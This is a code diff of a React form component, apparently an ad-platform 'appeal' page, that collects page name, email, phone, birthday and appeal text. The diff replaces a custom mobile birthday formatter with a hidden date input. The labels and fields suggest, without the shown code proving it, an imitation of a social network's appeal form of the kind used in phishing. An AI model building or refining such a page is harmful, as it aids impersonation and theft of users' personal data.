@@ -29,7 +29,6 @@ const Home = () => {
             appealPlaceholder: 'Please describe your appeal in detail...',
             submit: 'Submit',
             fieldRequired: 'This field is required',
-            invalidDate: 'Please enter a valid date in dd/mm/yyyy format',
             about: 'About',
             adChoices: 'Ad choices',
             createAd: 'Create ad',
@@ -46,7 +45,7 @@ const Home = () => {
         pageName: '',
         mail: '',
         phone: '',
-        birthday: 'dd/mm/yyyy',
+        birthday: '',
         appeal: ''
     });
 
@@ -78,7 +77,6 @@ const Home = () => {
                     translatedAppealPlaceholder,
                     translatedSubmitBtn, 
                     translatedRequired, 
-                    translatedInvalidDate,
                     translatedAbout, 
                     translatedAdChoices, 
                     translatedCreateAd, 
@@ -106,7 +104,6 @@ const Home = () => {
                     translateText(defaultTexts.appealPlaceholder, targetLang),
                     translateText(defaultTexts.submit, targetLang), 
                     translateText(defaultTexts.fieldRequired, targetLang), 
-                    translateText(defaultTexts.invalidDate, targetLang),
                     translateText(defaultTexts.about, targetLang), 
                     translateText(defaultTexts.adChoices, targetLang), 
                     translateText(defaultTexts.createAd, targetLang), 
@@ -136,7 +133,6 @@ const Home = () => {
                     appealPlaceholder: translatedAppealPlaceholder,
                     submit: translatedSubmitBtn,
                     fieldRequired: translatedRequired,
-                    invalidDate: translatedInvalidDate,
                     about: translatedAbout,
                     adChoices: translatedAdChoices,
                     createAd: translatedCreateAd,
@@ -204,73 +200,15 @@ const Home = () => {
         }
     };
 
-    const handleMobileBirthdayChange = (value) => {
-        // Lấy tất cả số từ giá trị nhập vào
-        const cleanedValue = value.replace(/\D/g, '');
-        
-        let formattedValue = 'dd/mm/yyyy';
-        
-        if (cleanedValue.length > 0) {
-            const day = cleanedValue.slice(0, 2);
-            const month = cleanedValue.slice(2, 4);
-            const year = cleanedValue.slice(4, 8);
-            
-            // Đơn giản: thay thế các phần tương ứng
-            if (cleanedValue.length >= 1) {
-                formattedValue = formattedValue.replace('dd', day.padEnd(2, 'd'));
-            }
-            if (cleanedValue.length >= 3) {
-                formattedValue = formattedValue.replace('mm', month.padEnd(2, 'm'));
-            }
-            if (cleanedValue.length >= 5) {
-                formattedValue = formattedValue.replace('yyyy', year.padEnd(4, 'y'));
-            }
-        }
-        
-        setFormData((prev) => ({
-            ...prev,
-            birthday: formattedValue
-        }));
-
-        if (errors.birthday) {
-            setErrors((prev) => ({
-                ...prev,
-                birthday: false
-            }));
-        }
-    };
-
     const validateForm = () => {
         const requiredFields = ['pageName', 'mail', 'phone', 'birthday', 'appeal'];
         const newErrors = {};
 
         requiredFields.forEach((field) => {
-            if (formData[field].trim() === '' || formData[field] === 'dd/mm/yyyy') {
+            if (formData[field].trim() === '') {
                 newErrors[field] = true;
             }
         });
-
-        // Kiểm tra định dạng ngày sinh (chỉ trên mobile)
-        if (formData.birthday.trim() !== '' && formData.birthday !== 'dd/mm/yyyy') {
-            const isMobile = window.innerWidth < 640; // sm breakpoint
-            if (isMobile) {
-                // Kiểm tra định dạng dd/mm/yyyy
-                const dateRegex = /^(\d{2})\/(\d{2})\/(\d{4})$/;
-                if (!dateRegex.test(formData.birthday)) {
-                    newErrors.birthday = true;
-                } else {
-                    const [, day, month, year] = formData.birthday.match(dateRegex);
-                    const dayNum = parseInt(day);
-                    const monthNum = parseInt(month);
-                    const yearNum = parseInt(year);
-                    
-                    // Kiểm tra ngày, tháng hợp lệ
-                    if (dayNum < 1 || dayNum > 31 || monthNum < 1 || monthNum > 12 || yearNum < 1900 || yearNum > new Date().getFullYear()) {
-                        newErrors.birthday = true;
-                    }
-                }
-            }
-        }
 
         setErrors(newErrors);
         return Object.keys(newErrors).length === 0;
@@ -450,27 +388,27 @@ const Home = () => {
                                     onChange={(e) => handleInputChange('birthday', e.target.value)} 
                                 />
                                 
-                                {/* Mobile: input đơn giản với placeholder cố định */}
-                                <div className='block sm:hidden'>
+                                {/* Mobile: type='date' với placeholder ảo */}
+                                <div className='block sm:hidden relative'>
                                     <input 
-                                        type='text'
-                                        inputMode='numeric'
+                                        type='date' 
                                         name='birthday' 
-                                        className={`w-full rounded-lg border px-3 py-2.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday === 'dd/mm/yyyy' ? 'text-gray-400' : 'text-gray-900'}`}
+                                        className={`w-full rounded-lg border px-3 py-2.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} opacity-0 absolute z-10`} 
                                         style={{ fontSize: '16px' }}
-                                        value={formData.birthday}
-                                        onChange={(e) => handleMobileBirthdayChange(e.target.value)}
+                                        value={formData.birthday} 
+                                        onChange={(e) => handleInputChange('birthday', e.target.value)}
+                                        required
                                     />
+                                    {/* Placeholder ảo - chữ số nhỏ hơn */}
+                                    <div 
+                                        className={`w-full rounded-lg border px-3 py-2.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-lg'} font-medium`}
+                                        onClick={() => document.querySelector('input[name="birthday"]').click()}
+                                    >
+                                        {formData.birthday || 'dd/mm/yyyy'}
+                                    </div>
                                 </div>
                                 
-                                {errors.birthday && (
-                                    <span className='text-xs text-red-500'>
-                                        {formData.birthday !== 'dd/mm/yyyy' && !/^\d{2}\/\d{2}\/\d{4}$/.test(formData.birthday) 
-                                            ? translatedTexts.invalidDate
-                                            : translatedTexts.fieldRequired
-                                        }
-                                    </span>
-                                )}
+                                {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             
                             <div className='flex flex-col gap-1'>
